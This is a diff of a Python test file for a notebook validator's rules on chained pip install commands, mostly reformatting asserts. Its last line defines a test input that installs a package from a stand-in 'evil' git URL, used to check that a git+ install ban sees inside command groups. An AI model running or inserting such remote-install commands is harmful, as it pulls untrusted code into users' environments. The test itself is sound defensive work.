@@ -910,9 +910,9 @@ def test_notebook_validator_keeps_a_group_conditional_throughout():
         '!pip install foo || (pip install bar ; pip install "torch==2.12.0")',
     ):
         assert [flag for _, flag in nv._split_chained(grouped)] == [False, True, True], grouped
-        assert nv.rule_inst_004_torchcodec_torch(
-            grouped, COLAB_TORCH211, "nb.ipynb", 0
-        ) == [], grouped
+        assert (
+            nv.rule_inst_004_torchcodec_torch(grouped, COLAB_TORCH211, "nb.ipynb", 0) == []
+        ), grouped
 
     # Outside a group, and after one closes, the operator still ends the tail.
     for ungrouped in (
@@ -920,9 +920,9 @@ def test_notebook_validator_keeps_a_group_conditional_throughout():
         '!pip install foo || (pip install bar) && pip install "torch==2.12.0"',
     ):
         assert [flag for _, flag in nv._split_chained(ungrouped)] == [False, True, False], ungrouped
-        assert len(
-            nv.rule_inst_004_torchcodec_torch(ungrouped, COLAB_TORCH211, "nb.ipynb", 0)
-        ) == 1, ungrouped
+        assert (
+            len(nv.rule_inst_004_torchcodec_torch(ungrouped, COLAB_TORCH211, "nb.ipynb", 0)) == 1
+        ), ungrouped
 
     # The git+ ban still sees inside the group, conditional or not.
     evil = "!pip install foo || (pip install bar && pip install git+https://example.com/evil.git)"
